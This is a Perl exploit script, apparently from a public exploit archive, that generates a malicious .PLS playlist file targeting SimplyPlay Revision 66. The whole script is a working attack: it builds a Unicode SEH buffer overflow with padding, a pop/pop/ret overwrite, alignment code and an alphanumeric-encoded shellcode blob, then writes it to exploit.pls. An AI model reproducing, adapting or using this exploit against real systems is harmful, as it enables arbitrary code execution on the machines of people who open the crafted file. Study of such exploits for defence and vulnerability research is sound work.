#!/usr/bin/perl
#
#[+]Exploit Title: SimplyPlay V.66 .PLS File Buffer Overflow Vulnerability
#[+]Date: 14\04\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.softpedia.com/get/Multimedia/Audio/Audio-Players/SimplyPlay.shtml
#[+]Version: Revision 66
#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#
#
 
 
print q{
            Exploit Buffer Overflow  Revision:66(UNICODE - SEH)
            Created BY C4SS!0 G0M3S
            E-mail Louredo_@hotmail.com
            Site www.exploit-br.org
  
};

sleep(1);
$buf = "\x41" x 2000;
$buf .= "\x41" x 53;
$buf .= "\x58\x50";
$buf .= "\xa9\x45";#P/P/RETN 0x004500A9
$buf .= "\x41\x50\x61\xc9\xc8\x41\x50\x41\xc3";
$buf .= "\x41" x 11;
$buf .= 
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ".
"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBYKWPNQGYWOCLLVRPHLJ9SDNDKD6QMNP".
"X01D8N853K8KLM3SHQXKD55NP487LQUI92X6VNCJUKC7D6NSMKRVJNZ02MLWORBJMMMPT8U1VMYO1JGV".
"61PL52QHJKVNUKEMD7W3LKKMKKU2KJPMWIMOXKMMROHMKURK8XCL7OK3JXOPLPOMS8S1CG4R7JWIHOKC".
"STNE3MO0W0SQTPQ5QP3HMZUWVKEWQ3N5HZU5ZJQM5VHO6UIOMOKY0J9KN0Q31X6LNNO3ULYTGX7RXNOQ".
"ITPCK8WM5COJH3KXJA";

$file = "[playlist]\n\n";
$file .= "File1=C:\\$buf\n";
$file .= q{Title1=lol
Length1=-1
NumberOfEntries=1
Version=2
};
print "[+]Creating the Exploit File...";
sleep(1);
open(f,">exploit.pls") or die "\n [+]Error:\n$!\n";
print f $file;
close(f);
print "\n[+]File Created With Success\n";
sleep(1);